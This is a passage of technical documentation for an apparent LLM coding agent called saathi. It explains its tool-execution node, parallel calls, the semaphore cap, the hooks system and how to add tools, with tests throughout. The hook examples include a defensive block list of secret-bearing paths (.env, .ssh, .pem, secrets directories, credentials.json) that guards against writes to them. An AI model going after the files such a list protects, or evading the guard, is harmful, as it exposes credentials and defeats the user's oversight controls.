2. Filesystem operations can overwhelm the OS if thousands run simultaneously.
3. External APIs often have rate limits.

The semaphore provides a clean, composable way to implement back-pressure.

### `_run_one` — The Per-Call Pipeline

```python
async def _run_one(call: dict) -> ToolMessage:
    name = call["name"]
    args = call.get("args", {})
    call_id = call["id"]
```

Each tool call is represented as a dict with three keys:

- `name`: the tool name (e.g., `"read_file"`)
- `args`: the arguments dict (e.g., `{"path": "auth.py"}`)
- `id`: the tool call ID (e.g., `"tc_5d8a2c"`)

The call ID is critical — it's what links this ToolMessage back to the tool_call that requested it.

Step 1: Block Check

```python
reason = hook_runner.check_block(name, args)
if reason is None:
    reason = await hook_runner.run_pre_tool(name, args)
if reason is not None:
    return ToolMessage(
        content=f"BLOCKED: {reason}. The tool was not executed.",
        tool_call_id=call_id,
        name=name,
    )
```

Two checks, in order:

1. `check_block` — synchronous path pattern match (no subprocess, instant)
2. `run_pre_tool` — async hook execution (may spawn subprocesses)

If either returns a non-None reason string, the tool is blocked. A ToolMessage is returned with the reason, but the tool itself is never called. This is critical — see Section 9.

Step 2: Unknown Tool Handling

```python
tool = tools_by_name.get(name)
if tool is None:
    return ToolMessage(
        content=f"Error: unknown tool '{name}'.",
        tool_call_id=call_id,
        name=name,
    )
```

If the model hallucinates a tool name that doesn't exist, the node returns an error message rather than raising an exception. The model can then either retry with the correct tool name or acknowledge the error.

Step 3: Tool Execution

```python
try:
    result = await tool.ainvoke(args)
except Exception as exc:
    log.error("tool_error", tool=name, error=str(exc))
    result = f"Error executing {name}: {exc}"
else:
    log.debug("tool_ok", tool=name)
```

`tool.ainvoke(args)` runs the tool asynchronously. If the tool raises an exception (bug in the tool code, unexpected OS error, etc.), it's caught and converted to an error string. The model receives the error and can decide what to do.

Step 4: Post-Tool Hook

```python
await hook_runner.run("post_tool", name, args)
```

Post-tool hooks run unconditionally after execution. They can't block the tool (it already ran). They're used for side effects: auto-formatting a file after it's written (`ruff format $SAATHI_TOOL_ARG_PATH`), running linters, updating build artifacts.

### `_guarded` — Semaphore + Pipeline

```python
async def _guarded(call: dict) -> ToolMessage:
    async with semaphore:
        return await _run_one(call)
```

`_guarded` wraps `_run_one` in the semaphore. At most `max_parallel_tools` calls can be inside `_run_one` simultaneously. Additional calls wait in the semaphore's queue.

### `hooked_tool_node` — The Entry Point

```python
async def hooked_tool_node(state: AgentState) -> dict:
    last = state["messages"][-1]
    tool_calls = list(getattr(last, "tool_calls", []) or [])
    if not tool_calls:
        return {"messages": []}

    messages = await asyncio.gather(*(_guarded(call) for call in tool_calls))
    return {"messages": list(messages)}
```

The node:

1. Gets the last message (must be an AIMessage with tool_calls)
2. Extracts all tool calls
3. Runs all of them in parallel via `asyncio.gather`
4. Returns the results as a list of ToolMessages

`asyncio.gather(*coroutines)` runs all coroutines concurrently and waits for all to complete. The results come back in the same order as the input coroutines, so `messages[i]` corresponds to `tool_calls[i]`.

### The Factory Pattern

`make_hooked_tool_node` returns a function, not an object. This is the closure pattern:

```python
def make_hooked_tool_node(tools, hook_runner):
    # This code runs ONCE at graph build time
    tools_by_name = {t.name: t for t in tools}
    semaphore = asyncio.Semaphore(...)
    
    async def hooked_tool_node(state):
        # This code runs on EVERY tool node invocation
        ...
    
    return hooked_tool_node  # return the function itself
```

The dict and semaphore are created once. The returned function (`hooked_tool_node`) closes over them. Every time the graph invokes the tool node, it calls `hooked_tool_node(state)` which reuses the pre-built dict and semaphore.

This is more efficient than an object with `__init__` because the dict building is a one-time cost, not per-call.

---

## 8. `_result_to_text`

### The MCP Content Block Problem

LangChain's built-in tools return Python strings. Clean, simple.

MCP (Model Context Protocol) tools return a different format — a list of content blocks:

```python
# MCP tool result
[
    {"type": "text", "text": "File contents: def login(...)..."},
    {"type": "text", "text": "Total lines: 42"},
]
```

Or potentially:

```python
[
    {"type": "text", "text": "Search results:"},
    {"type": "text", "text": "Result 1: ..."},
    {"type": "text", "text": "Result 2: ..."},
]
```

If you pass this list directly as the ToolMessage content, the model sees `[{'type': 'text', 'text': '...'}]` as a literal string — not the intended text content. The model would likely be confused and produce poor output.

### The `_result_to_text` Normalizer

```python
def _result_to_text(result: object) -> str:
    """Coerce a tool result to text. Built-in tools return strings; MCP tools
    return a list of content blocks like ``[{"type": "text", "text": "..."}]``."""
    if isinstance(result, str):
        return result
    if isinstance(result, list):
        parts: list[str] = []
        for item in result:
            if isinstance(item, dict) and item.get("type") == "text":
                parts.append(str(item.get("text", "")))
            else:
                parts.append(str(item))
        return "\n".join(parts)
    return str(result)
```

Three cases:

1. **String result** (all built-in saathi tools) → returned as-is
2. **List result** (MCP tools) → extract the `text` field from each `{"type": "text", "text": "..."}` block, join with newlines
3. **Anything else** → `str(result)` as fallback

For non-text MCP content blocks (e.g., `{"type": "image", "data": "..."}` or `{"type": "resource", "uri": "..."}`), the fallback `str(item)` ensures they're represented as text, though not in a useful format. In practice, coding tools return text blocks only.

### Why the Fallback `str(item)` Matters

Without the fallback, if an MCP tool returns an unexpected content type, `_result_to_text` would silently drop it. The model would receive empty content and be confused. With the fallback, the model receives a string representation (even if ugly) and can acknowledge the unexpected format.

This is the principle of graceful degradation: prefer excellent output, but always produce *something*.

---

## 9. Every Tool Call is Answered

### The Invariant

There is an absolute invariant in the tool node:

```text
len(ToolMessages returned) == len(tool_calls in AIMessage)
```

Every tool call must be answered with exactly one ToolMessage. No exceptions.

### Why Breaking This Invariant Is Catastrophic

The tool-use protocol (used by OpenAI, Anthropic, Ollama, and most LLMs) requires that every AIMessage tool call be followed by a corresponding ToolMessage in the conversation history. The link is via the `tool_call_id`.

If a tool call goes unanswered — say, because it threw an exception and the node returned early — the next time the agent node runs, the LLM sees:

```text
AIMessage(tool_calls=[tc_abc, tc_def])   # two calls
ToolMessage(tool_call_id=tc_abc)          # only one result
                                          # tc_def is missing!
```

The behavior at this point is undefined. Different models handle it differently:

- Some crash with a structured error ("missing tool result for call ID tc_def")
- Some hallucinate a result ("let me assume that call succeeded")
- Some enter an infinite loop trying to call the tool again
- Some produce garbled output

All of these outcomes are bad. The invariant must hold.

### How Every Case Returns a ToolMessage

Let's trace through every exit path in `_run_one` to verify:

**Case 1: Path is blocked by `check_block`**

```python
reason = hook_runner.check_block(name, args)
if reason is not None:
    return ToolMessage(
        content=f"BLOCKED: {reason}. The tool was not executed.",
        tool_call_id=call_id,  # ← ANSWERED
        name=name,
    )
```

Returns a ToolMessage. ✓

Case 2: Blocked by pre_tool hook

```python
reason = await hook_runner.run_pre_tool(name, args)
if reason is not None:
    return ToolMessage(
        content=f"BLOCKED: {reason}. The tool was not executed.",
        tool_call_id=call_id,  # ← ANSWERED
        name=name,
    )
```

Returns a ToolMessage. ✓

Case 3: Unknown tool

```python
tool = tools_by_name.get(name)
if tool is None:
    return ToolMessage(
        content=f"Error: unknown tool '{name}'.",
        tool_call_id=call_id,  # ← ANSWERED
        name=name,
    )
```

Returns a ToolMessage. ✓

Case 4: Tool raises exception

```python
try:
    result = await tool.ainvoke(args)
except Exception as exc:
    result = f"Error executing {name}: {exc}"
```

`result` is set to an error string. Falls through to:

```python
return ToolMessage(content=_result_to_text(result), tool_call_id=call_id, name=name)
```

Returns a ToolMessage. ✓

Case 5: Normal execution

```python
result = await tool.ainvoke(args)
# ...
return ToolMessage(content=_result_to_text(result), tool_call_id=call_id, name=name)
```

Returns a ToolMessage. ✓

Every exit path returns a ToolMessage with the correct `tool_call_id`. The invariant holds by construction.

### The Test That Verifies the Invariant

```python
# From tests/test_parallel.py
async def test_every_tool_call_is_answered() -> None:
    node = make_hooked_tool_node([slow_echo], _no_hooks())
    calls = [tool_call("slow_echo", {"label": str(i)}, f"id{i}") for i in range(4)]
    out = await node(ai_with_tool_calls(calls))
    assert {m.tool_call_id for m in out["messages"]} == {f"id{i}" for i in range(4)}
```

Four calls (`id0`, `id1`, `id2`, `id3`). The test asserts that the set of `tool_call_id` values in the output exactly equals the set of input call IDs. No answers missing, no extra answers.

---

## 10. Parallel Execution Timing

### The Performance Argument

In a typical saathi turn, the model might call 3-5 tools simultaneously. For example, when starting a new task:

```text
AIMessage(tool_calls=[
    read_file("src/auth.py"),
    read_file("src/models.py"),
    read_file("tests/test_auth.py"),
    list_directory("."),
    git_status(),
])
```

Five simultaneous tool calls. If each takes 0.2 seconds (filesystem reads + git subprocess), the timing difference is stark:

```text
SERIAL EXECUTION:
  read_file  ████ 0.2s
  read_file       ████ 0.2s
  read_file            ████ 0.2s
  list_dir                  ████ 0.2s
  git_status                     ████ 0.2s
  Total: 1.0s

PARALLEL EXECUTION:
  read_file  ████ 0.2s
  read_file  ████ 0.2s
  read_file  ████ 0.2s
  list_dir   ████ 0.2s
  git_status ████ 0.2s
  Total: 0.2s  (5x faster)
```

With `asyncio.gather`, all five IO-bound operations run concurrently. The total time is approximately the time of the SLOWEST operation, not the SUM.

For purely CPU-bound operations, `asyncio.gather` would not help (Python's GIL means only one thread runs at a time). But filesystem reads, subprocess calls, and HTTP requests are all IO-bound — they spend most of their time waiting for the OS or network, not burning CPU cycles.

### The Test That Proves It

```python
# From tests/test_parallel.py
_DELAY = 0.3

@tool
async def slow_echo(label: str) -> str:
    """Sleep then echo the label back."""
    await asyncio.sleep(_DELAY)
    return f"done:{label}"


async def test_calls_run_in_parallel() -> None:
    node = make_hooked_tool_node([slow_echo], _no_hooks())
    calls = [tool_call("slow_echo", {"label": str(i)}, f"c{i}") for i in range(5)]

    start = time.monotonic()
    out = await node(ai_with_tool_calls(calls))
    elapsed = time.monotonic() - start

    assert len(out["messages"]) == 5
    # 5 serial calls would take ~5*_DELAY; parallel should be well under half that.
    assert elapsed < (5 * _DELAY) * 0.5
    assert sorted(m.content for m in out["messages"]) == [f"done:{i}" for i in range(5)]
```

Five calls, each sleeping 300ms. Serial would take 1,500ms. Parallel should take ~300ms. The test asserts `elapsed < 750ms` — well under the serial time.

The assertion `elapsed < (5 * _DELAY) * 0.5` is conservative: parallel execution should complete in roughly 300ms, and the test allows up to 750ms to account for test environment overhead (CI machines can be slow).

### Timing Diagram with Real Tool Types

Here's a realistic ASCII timing diagram for a typical saathi code-review turn:

```text
Time →
0ms                 100ms               200ms               300ms
┌──────────────────────────────────────────────────────────────────┐
│ PARALLEL (max_parallel_tools=8)                                  │
│                                                                  │
│ read_file(auth.py)    ████████████  120ms                        │
│ read_file(models.py)  ████████████████  150ms                    │
│ read_file(test_a.py)  █████████  90ms                            │
│ git_status()          ████████  80ms                             │
│ git_diff()            ██████████████  140ms                      │
│                                                                  │
│ TOTAL: ~150ms (time of slowest)                                  │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ SERIAL (hypothetical)                                            │
│                                                                  │
│ read_file(auth.py)    ████████████  120ms                        │
│                                   read_file(models.py)          │
│                                   ████████████████  150ms       │
│                                                   read_file...  │
│                                                   ...           │
│                                                   ...           │
│                                                                  │
│ TOTAL: ~580ms (sum of all)                                       │
└──────────────────────────────────────────────────────────────────┘
```

On a real machine where each IO call takes 50-200ms, parallel execution saves 200-500ms per turn. Over a long session with hundreds of turns, this adds up to minutes of saved wait time.

---

## 11. The Semaphore Cap

### Why Limit Parallelism?

Unlimited parallelism sounds ideal, but it creates problems:

1. **Ollama's parallel request limit.** `OLLAMA_NUM_PARALLEL` (default 4 in Ollama) limits how many model requests can be processed simultaneously. If saathi sends 20 parallel HTTP requests to Ollama, 16 will queue up and effectively run serially. The semaphore should match Ollama's limit.

2. **Filesystem contention.** If 50 coroutines simultaneously try to read 50 large files, the OS's disk scheduler becomes the bottleneck. Limiting to 8-16 concurrent filesystem operations typically gives better throughput.

3. **Subprocess overhead.** Spawning 20 concurrent subprocesses (git, bash, patch) consumes process table slots and memory. A small cap (2-4) is appropriate when tools frequently spawn subprocesses.

### The Semaphore in Action

```python
semaphore = asyncio.Semaphore(max(1, settings.max_parallel_tools))

async def _guarded(call: dict) -> ToolMessage:
    async with semaphore:
        return await _run_one(call)
```

`async with semaphore` acquires a slot before running `_run_one`. When `_run_one` finishes, the slot is automatically released (by the context manager exit). Other `_guarded` calls waiting in `asyncio.gather` are unblocked.

### The Test That Proves Capping Works

```python
# From tests/test_parallel.py
async def test_semaphore_caps_concurrency(monkeypatch) -> None:
    from saathi.config import settings
    monkeypatch.setattr(settings, "max_parallel_tools", 2)

    state = {"active": 0, "peak": 0}
    lock = asyncio.Lock()

    @tool
    async def tracked(i: int) -> str:
        """Track how many copies run at once."""
        async with lock:
            state["active"] += 1
            state["peak"] = max(state["peak"], state["active"])
        await asyncio.sleep(0.05)
        async with lock:
            state["active"] -= 1
        return str(i)

    node = make_hooked_tool_node([tracked], _no_hooks())
    calls = [tool_call("tracked", {"i": i}, f"c{i}") for i in range(6)]
    await node(ai_with_tool_calls(calls))

    assert state["peak"] <= 2
```

Six calls, semaphore cap of 2. The `tracked` tool increments a counter when it starts, decrements when it finishes, and records the peak. After all 6 calls complete, `peak` must be ≤ 2.

This test uses `monkeypatch` to override `settings.max_parallel_tools` at test time without modifying any files.

### Choosing the Right Cap

The default is `max_parallel_tools = 8`. Tuning guide:

| Scenario | Recommended Cap |
| ---------- | ---------------- |
| Ollama with `OLLAMA_NUM_PARALLEL=2` | 2 |
| Ollama with `OLLAMA_NUM_PARALLEL=4` (default) | 4 |
| Mostly filesystem tools | 8-16 |
| Mostly HTTP/API tools with rate limits | 2-4 |
| Mostly subprocess tools | 3-6 |

Set in `~/.saathi/config.json`:

```json
{
  "max_parallel_tools": 4
}
```

---

## 12. Hook Integration

### The Hooks System Overview

Saathi supports four hook events:

```json
{
  "pre_tool":   ["echo 'calling $SAATHI_TOOL_NAME'"],
  "post_tool":  ["ruff format $SAATHI_TOOL_ARG_PATH"],
  "post_turn":  ["pytest -q"],
  "block_paths": ["*.env", "**/secrets/*", "*.pem"]
}
```

Configured in `.saathi/hooks.json` at the project root.

The `pre_tool` hooks can BLOCK a tool call. `post_tool` and `post_turn` hooks are best-effort side effects.

### `check_block` — Synchronous Path Guard

```python
# From src/saathi/hooks/runner.py
def check_block(self, tool_name: str, tool_args: dict) -> str | None:
    """Return a reason string if this tool call must be blocked, else None."""
    if tool_name not in ("write_file", "patch_file"):
        return None
    target = _extract_path(tool_args)
    if not target:
        return None
    for pattern in self.config.block_paths:
        if fnmatch.fnmatch(target, pattern) or fnmatch.fnmatch(Path(target).name, pattern):
            return f"path '{target}' matches blocked pattern '{pattern}'"
    return None
```

`check_block` is synchronous — no subprocess, no async. It checks if the tool's target path matches any `block_paths` pattern using Python's built-in `fnmatch`.

Only `write_file` and `patch_file` are subject to path blocking — the tools that can modify files. `read_file` is not blocked (you can read sensitive files; just don't write them).

Path matching is done in two ways:

1. `fnmatch.fnmatch(target, pattern)` — matches the full path
2. `fnmatch.fnmatch(Path(target).name, pattern)` — matches just the filename

So `block_paths: ["*.env"]` blocks both `/home/user/project/.env` (filename match) and `/home/user/.env.production` (filename match).

Examples:

```json
"block_paths": [
    "*.env",           // any .env file anywhere
    "**/.ssh/**",      // anything inside .ssh/
    "*.pem",           // private keys
    "**/secrets/**",   // anything in a secrets/ directory
    "credentials.json" // specific filename
]
```

### `run_pre_tool` — Async Hook Execution That Can Block

```python
async def run_pre_tool(self, tool_name: str, tool_args: dict) -> str | None:
    """Fire pre_tool hooks; return a block reason if any command fails."""
    results = await self.run("pre_tool", tool_name, tool_args)
    for r in results:
        if not r.ok:
            return f"pre_tool hook rejected the call: {r.output.strip()}"
    return None
```

`run_pre_tool` runs all configured `pre_tool` commands. If ANY returns a non-zero exit code, the tool call is blocked. The hook's output (stdout + stderr combined) becomes the block reason returned to the model.

This enables sophisticated gatekeeping:

```bash
# .saathi/hooks.json pre_tool hook
#!/bin/bash
# Block writes to Python files during production deploys
if [[ "$SAATHI_TOOL_NAME" == "write_file" || "$SAATHI_TOOL_NAME" == "patch_file" ]]; then
    if [[ "$SAATHI_TOOL_ARG_PATH" == *.py ]]; then
        if [ -f ".deploy-lock" ]; then
            echo "Deploy in progress — Python file writes are locked"
            exit 1
        fi
    fi
fi
```

The model would receive: `BLOCKED: pre_tool hook rejected the call: Deploy in progress — Python file writes are locked`.

### Environment Variables Available to Hooks

All hooks receive these environment variables:

| Variable | Description |
| ---------- | ------------- |
| `SAATHI_EVENT` | Event type: `pre_tool`, `post_tool`, `post_turn` |
| `SAATHI_TOOL_NAME` | The tool name: `read_file`, `write_file`, etc. |
| `SAATHI_TOOL_ARGS` | JSON string of all tool arguments |
| `SAATHI_TOOL_ARG_PATH` | The `path` argument (if the tool has one) |

```python
# From hooks/runner.py
def _build_env(event: str, tool_name: str, tool_args: dict) -> dict[str, str]:
    env = dict(os.environ)
    env["SAATHI_EVENT"] = event
    env["SAATHI_TOOL_NAME"] = tool_name
    env["SAATHI_TOOL_ARGS"] = json.dumps(tool_args)
    path = _extract_path(tool_args)
    if path:
        env["SAATHI_TOOL_ARG_PATH"] = path
    return env
```

### The Full Hook Pipeline in `_run_one`

```text
Tool call received
    │
    ▼
check_block(name, args)          ← synchronous path check
    │ ← blocked?
    │ yes → return ToolMessage("BLOCKED: path matches pattern")
    │ no ↓
    ▼
run_pre_tool(name, args)         ← async hook subprocess
    │ ← blocked?
    │ yes → return ToolMessage("BLOCKED: hook rejected")
    │ no ↓
    ▼
tools_by_name.get(name)          ← tool lookup
    │ ← not found?
    │ none → return ToolMessage("Error: unknown tool")
    │ found ↓
    ▼
tool.ainvoke(args)               ← actual execution
    │ ← exception?
    │ exc → result = "Error: ..."
    │ ok ↓
    ▼
hook_runner.run("post_tool")     ← async best-effort side effect
    │
    ▼
return ToolMessage(result)       ← always returns, never raises
```

Every exit → ToolMessage. Pipeline, not exception chain.

---

## 13. Tool Results in the Agent Loop

### The ReAct Loop

LangGraph implements the ReAct (Reasoning + Acting) pattern:

```flow
START
  │
  ▼
agent_node ──→ [has tool_calls?] ──yes──→ tools_node ──→ agent_node
                       │                                        │
                       no                              (loop continues)
                       │
                       ▼
                      END
```

The `tools_condition` function (from `langgraph.prebuilt`) routes from `agent` to either `tools` or `END` based on whether the last AIMessage has tool calls:

```python
# From src/saathi/agent/graph.py
builder.add_conditional_edges("agent", tools_condition)
builder.add_edge("tools", "agent")
```

This means: after the tool node runs, always go back to the agent. The agent decides when to stop (by producing an AIMessage without tool calls).

### The Conversation Structure the LLM Sees

Each time the agent node runs, the LLM receives the FULL conversation history, including all ToolMessages. Here's what the LLM sees on its second call (after one tool round-trip):

```python
messages = [
    SystemMessage(content="You are Saathi..."),   # system prompt (ephemeral)
    HumanMessage("What does the login function do?"),  # turn 1 user
    AIMessage(tool_calls=[{                            # turn 1 agent decision
        "name": "read_file",
        "args": {"path": "src/auth.py"},
        "id": "tc_abc",
    }]),
    ToolMessage(                                       # turn 1 tool result
        content="def login(user, password):\n    ...",
        tool_call_id="tc_abc",
        name="read_file",
    ),
    # LLM is called here → produces final answer
]
```

The LLM reasons: "I have the file content. Now I can answer the question." It produces:

```python
AIMessage(
    content="The login function hashes the password and queries the database...",
    tool_calls=[],   # no more tool calls → END
)
```

`tools_condition` sees no tool calls → routes to END. The graph finishes.

### Tool Call ID Linkage in Practice

The `tool_call_id` in `ToolMessage` must match an `id` in `AIMessage.tool_calls`. This is the protocol:

```python
# AIMessage says "I'm calling these tools"
AIMessage(
    content="",
    tool_calls=[
        {"name": "read_file", "args": {"path": "a.py"}, "id": "tc_1", "type": "tool_call"},
        {"name": "read_file", "args": {"path": "b.py"}, "id": "tc_2", "type": "tool_call"},
    ]
)

# ToolMessages answer the calls
ToolMessage(content="contents of a.py", tool_call_id="tc_1", name="read_file")
ToolMessage(content="contents of b.py", tool_call_id="tc_2", name="read_file")
```

The LLM sees both the calls and the results, linked by ID. Without the IDs, the LLM would see two results but wouldn't know which result came from which call (they might have identical content, or one might have errored).

With the IDs, the LLM can reason: "tool call `tc_1` (reading a.py) returned X, tool call `tc_2` (reading b.py) returned Y. Let me compare them."

---

## 14. Async Tools

### Why Tools Should Be `async def`

The tool node runs all tool calls via `asyncio.gather`. For this to provide genuine parallelism, the tools must be non-blocking — they must release control to the event loop while waiting for IO.

A synchronous tool blocks the entire event loop:

```python
@tool
def read_file_sync(path: str) -> str:
    """SYNC: blocks the event loop while reading"""
    with open(path) as f:
        return f.read()   # blocks until file read completes
```

While `read_file_sync` is reading, no other coroutines can run. All the "parallel" tool calls queue up behind it.

An async tool yields control during IO:

```python
@tool
async def read_file_async(path: str) -> str:
    """ASYNC: yields during IO"""
    import aiofiles
    async with aiofiles.open(path) as f:
        return await f.read()   # yields to event loop while waiting
```

While `read_file_async` waits for the file read, the event loop can run other coroutines.

### When Saathi's Tools Are Sync vs. Async

Looking at saathi's tool implementations:

```python
# Sync tools (most of saathi's tools)
@tool
def read_file(path: str) -> str: ...

@tool
def write_file(path: str, content: str) -> str: ...

@tool
def run_bash(command: str) -> str: ...   # subprocess.run — SYNCHRONOUS!
```

Wait — `run_bash` uses `subprocess.run`, which is synchronous. Doesn't this block the event loop?

Yes, it does. This is a known limitation of saathi's current implementation. For true parallelism of bash commands, you'd need `asyncio.create_subprocess_exec`:

```python
# How run_bash SHOULD be async (not the current implementation)
@tool
async def run_bash_async(command: str) -> str:
    proc = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await proc.communicate()
    ...
```

However, in practice, `subprocess.run` calls are short (60 second timeout, usually much faster). LangChain's `tool.ainvoke` wraps synchronous tool calls in a thread pool executor automatically, which gives them async-like behavior without blocking the main event loop.

LangChain does this under the hood: when you call `await tool.ainvoke(args)` and the tool is defined as `def` (not `async def`), LangChain runs it in `asyncio.get_event_loop().run_in_executor(None, tool.func, args)`. This moves the blocking call to a thread pool, freeing the event loop.

So synchronous tools are not ideal but are workable. The test results confirm parallelism works:

```python
async def test_calls_run_in_parallel() -> None:
    node = make_hooked_tool_node([slow_echo], _no_hooks())
    ...
    assert elapsed < (5 * _DELAY) * 0.5   # this passes, proving parallelism works
```

The `slow_echo` test tool is `async def` with `asyncio.sleep`, which IS truly non-blocking.

### CPU-Bound Tools and `run_in_executor`

For CPU-intensive operations (e.g., parsing a large file, computing checksums), use `run_in_executor` explicitly:

```python
import asyncio
from concurrent.futures import ThreadPoolExecutor
from langchain_core.tools import tool

_executor = ThreadPoolExecutor(max_workers=4)

@tool
async def compute_checksum(path: str) -> str:
    """Compute the SHA-256 checksum of a file (CPU-intensive, uses thread pool)."""
    import hashlib
    
    loop = asyncio.get_event_loop()
    
    def _compute():
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    
    return await loop.run_in_executor(_executor, _compute)
```

The `run_in_executor` call moves the CPU-bound work to a thread, freeing the event loop for other coroutines.

### The `@tool` Decorator and Async

The `@tool` decorator works on both sync and async functions:

```python
# Sync tool — works
@tool
def sync_tool(x: str) -> str:
    return x.upper()

# Async tool — also works
@tool
async def async_tool(x: str) -> str:
    await asyncio.sleep(0)
    return x.upper()
```

Both produce a `StructuredTool` object with an `ainvoke` method. For the sync version, `ainvoke` uses `run_in_executor`. For the async version, `ainvoke` calls the coroutine directly.

---

## 15. Adding a New Tool to Saathi

### Step-by-Step Guide

Adding a new tool to saathi is a four-step process. We'll walk through adding a hypothetical `list_processes` tool that shows running processes.

#### Step 1: Write the Function

Create or add to a file in `src/saathi/tools/`:

```python
# src/saathi/tools/system.py
"""System information tools."""

import subprocess
from langchain_core.tools import tool


@tool
def list_processes(filter_name: str = "") -> str:
    """
    List currently running processes.
    Optionally filter by process name substring.
    Examples: list_processes() → all processes
              list_processes("python") → only Python processes
    """
    try:
        import sys
        if sys.platform == "win32":
            cmd = ["tasklist", "/FO", "CSV"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            lines = result.stdout.splitlines()
            if filter_name:
                lines = [l for l in lines if filter_name.lower() in l.lower()]
            return "\n".join(lines[:50])  # cap at 50 lines
        else:
            cmd = ["ps", "aux", "--sort=-%cpu"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            lines = result.stdout.splitlines()
            if filter_name:
                header = lines[0] if lines else ""
                matching = [l for l in lines[1:] if filter_name.lower() in l.lower()]
                lines = [header] + matching
            return "\n".join(lines[:50])
    except subprocess.TimeoutExpired:
        return "Error: ps command timed out"
    except Exception as e:
        return f"Error listing processes: {e}"
```

Key considerations when writing the function:

1. **Docstring quality**: The docstring is what the model reads. Make it clear, include examples.
2. **Error handling**: Return error strings, don't raise. The tool node catches exceptions, but it's better to handle them gracefully yourself.
3. **Output size**: Cap output to prevent context overflow.
4. **Platform compatibility**: Consider Windows vs Unix differences.

#### Step 2: Add the `@tool` Decorator

(Already done in Step 1 — just making it explicit.)

The `@tool` decorator must be applied for the function to become a LangChain tool. Without it, it's just a plain Python function. With it, it has a `name`, `description`, `args_schema`, and `ainvoke` method.

#### Step 3: Add to `ALL_TOOLS` in `__init__.py`

```python
# src/saathi/tools/__init__.py
from saathi.tools.filesystem import list_directory, patch_file, read_file, write_file
from saathi.tools.git import (
    git_commit,
    git_diff,
    git_diff_staged,
    git_log,
    git_status,
)
from saathi.tools.memory_tools import recall_memory, save_memory
from saathi.tools.search import search_across_files, search_in_file, search_web
from saathi.tools.shell import run_bash
from saathi.tools.system import list_processes    # ← ADD THIS IMPORT

ALL_TOOLS = [
    read_file,
    write_file,
    patch_file,
    list_directory,
    run_bash,
    search_in_file,
    search_across_files,
    search_web,
    save_memory,
    recall_memory,
    git_status,
    git_diff,
    git_diff_staged,
    git_log,
    git_commit,
    list_processes,    # ← ADD THIS ENTRY
]

__all__ = ["ALL_TOOLS"]
```

`ALL_TOOLS` is the single source of truth. Everything in this list gets:

1. Bound to the LLM via `llm.bind_tools(tools)` in `graph.py`
2. Made available to the tool node via `make_hooked_tool_node(tools, ...)`
3. Exposed to MCP if the tool is also registered as an MCP tool

Adding to `ALL_TOOLS` is the ONLY change needed for the tool to be available. The model automatically receives the updated tool list on next startup.

#### Step 4: Write a Test

```python
# tests/test_tools.py (or a new test_system.py)
from saathi.tools.system import list_processes


def test_list_processes_returns_output() -> None:
    """list_processes should return at least one line."""
    result = list_processes.invoke({})
    assert isinstance(result, str)
    assert len(result) > 0
    assert "Error" not in result


def test_list_processes_filter() -> None:
    """Filtering by a common process name should return fewer results."""
    all_procs = list_processes.invoke({})
    python_procs = list_processes.invoke({"filter_name": "python"})
    
    # Python procs should be a subset (fewer lines) than all procs
    assert len(python_procs.splitlines()) <= len(all_procs.splitlines())


def test_list_processes_timeout_returns_error() -> None:
    """Verify graceful error handling (mock the timeout)."""
    import subprocess
    from unittest.mock import patch, MagicMock
    
    with patch("subprocess.run") as mock_run:
        mock_run.side_effect = subprocess.TimeoutExpired("ps", 10)
        result = list_processes.invoke({})
    
    assert "timed out" in result.lower()
```

### Tool Testing Best Practices

1. **Test the tool function directly** via `.invoke({})`, not through the full graph. This isolates the tool's behavior from the graph's complexity.

2. **Test error cases explicitly.** Mock `subprocess.run`, `Path.read_text`, or whatever the tool calls to simulate failures. Verify that errors return strings, not raise exceptions.

3. **Test output format.** Does the output make sense to a reader? Would a model understand it? Check that outputs don't have garbage or irrelevant noise.

4. **Test size limits.** For tools that cap output, verify the cap is respected.

5. **Test on both platforms** if the tool has platform-specific code (Windows vs Unix).

### Verifying the Schema

After adding a tool, you can inspect the generated schema to make sure it looks right:

```python
# Interactive Python session
from saathi.tools.system import list_processes

# The tool's name
print(list_processes.name)
# "list_processes"

# The description (from docstring)
print(list_processes.description)
# "List currently running processes. ..."

# The JSON schema
import json
print(json.dumps(list_processes.args_schema.schema(), indent=2))
# {
#   "type": "object",
#   "properties": {
#     "filter_name": {
#       "type": "string",
#       "description": "filter_name",
#       "default": ""
#     }
#   }
# }
```

If the schema looks wrong (missing parameters, wrong types), check the type annotations and default values.

### The Model Picks Up the Tool Automatically

On the next `saathi` startup, the model receives the full tool list including `list_processes`. No configuration changes needed. No restart of services. No explicit registration.

The binding happens in `build_graph`:

```python
# From src/saathi/agent/graph.py
llm = make_llm(model_id).bind_tools(tools)
```

`bind_tools(tools)` serializes all tool schemas and sends them to the LLM in the API request. The LLM sees the new tool and can use it.

### Common Mistakes When Adding Tools

**Mistake 1: Forgetting to add to `ALL_TOOLS`**

The function has `@tool` but isn't in `ALL_TOOLS`. The schema is never sent to the LLM. The model can't call it. No error — the tool just silently doesn't exist.

Mistake 2: Raising exceptions instead of returning error strings

```python
# BAD: raises an exception
@tool
def bad_tool(path: str) -> str:
    with open(path) as f:  # raises FileNotFoundError if missing
        return f.read()

# GOOD: returns error string
@tool
def good_tool(path: str) -> str:
    try:
        with open(path) as f:
            return f.read()
    except FileNotFoundError:
        return f"Error: file not found: {path}"
```

The tool node catches exceptions and converts them to error ToolMessages, but this is a last resort. Better to handle errors in the tool and return descriptive messages.

Mistake 3: Returning too much data

```python
# BAD: might return megabytes of data
@tool
def read_entire_log(path: str) -> str:
    return Path(path).read_text()

# GOOD: capped output
@tool
def read_entire_log(path: str, max_lines: int = 100) -> str:
    lines = Path(path).read_text().splitlines()
    if len(lines) > max_lines:
        return "\n".join(lines[-max_lines:]) + f"\n... (showing last {max_lines} of {len(lines)} lines)"
    return "\n".join(lines)
```

Large tool outputs consume context window budget. The model gets confused when the output is truncated mid-sentence by the context limit.

Mistake 4: A docstring that misleads the model

```python
# BAD: docstring doesn't explain enough
@tool
def patch_file(path: str, diff: str) -> str:
    """Edit a file."""
    ...

# GOOD: docstring sets clear expectations
@tool
def patch_file(path: str, diff: str) -> str:
    """Apply a unified diff patch to an existing file (prefer over write_file for edits)."""
    ...
```

The docstring "Edit a file" gives the model no guidance on the format of `diff`. The good version says "unified diff" which the model knows how to generate.

---

## Summary

